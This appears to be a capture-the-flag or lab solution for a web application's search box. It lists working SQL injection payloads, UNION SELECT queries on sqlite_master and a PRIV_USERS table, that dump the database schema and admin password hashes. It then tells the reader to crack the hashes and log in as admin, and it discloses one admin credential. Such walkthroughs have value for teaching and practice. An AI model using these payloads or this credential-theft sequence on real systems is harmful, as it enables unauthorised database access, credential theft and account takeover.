1. Register and login to a normal account
2. Search for `blahaj' UNION SELECT type, name, sql FROM sqlite_master WHERE type = 'table'; --` to find all tables and their schemas in the database
3. Search for `blahaj' UNION SELECT is_admin, username, password FROM PRIV_USERS WHERE is_admin = 1; --` to find the username and passwords of admin users
4. Identify that the stored passwords are hashes, and crack them somehow
5. Login with any admin account using the cracked passwords. One admin account is `Cisco:test101`